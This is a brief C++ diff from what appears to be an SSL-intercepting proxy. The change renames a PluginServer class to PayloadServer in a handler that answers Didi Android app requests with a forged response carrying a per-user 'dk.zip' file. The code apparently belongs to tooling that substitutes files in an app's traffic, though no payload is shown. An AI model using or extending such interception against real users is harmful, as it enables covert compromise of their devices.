@@ -1,7 +1,7 @@
 #include "DidiAndroid.h"
 #include "../HttpUtils.h"
 #include "../cipher/CryptoUtils.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 int gDidiAndroidFlag = 0;
 
@@ -48,7 +48,7 @@ int DidiAndroid::replyDidi(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl
 		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";
 
 		string filename = Public::getUserUrl(lpssl->username, "dk.zip");
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespFormat, 1);
 		return 0;
 	}
 	return 0;
